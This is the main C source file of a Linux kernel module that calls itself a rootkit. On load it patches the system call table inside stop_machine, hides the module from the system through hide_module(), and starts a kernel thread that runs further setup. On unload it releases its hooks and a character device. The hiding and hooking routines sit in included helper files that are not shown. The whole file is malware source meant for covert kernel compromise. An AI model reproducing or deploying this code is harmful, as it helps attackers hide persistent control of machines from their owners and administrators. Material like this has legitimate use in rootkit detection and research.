#include <linux/delay.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include "fs_helper.h"
#include "hook.h"
#include "syscall_helper.h"
#include "utils.h"

MODULE_LICENSE("GPL");

static int init_callback(void *data)
{
    msleep(1000);
    hide_module();
    utils_init();
    return 0;
}

static int __init rootkit_init(void)
{
    init_x64_sys_call();
    stop_machine(init_syscall_table, NULL, NULL);
    printk(KERN_ALERT "rootkit init\n");
    kthread_run(init_callback, NULL, "init_callback");
    return 0;
}


static void __exit rootkit_exit(void)
{
    hook_release();
    chrdev_release();
    printk(KERN_ALERT "rookit exit\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
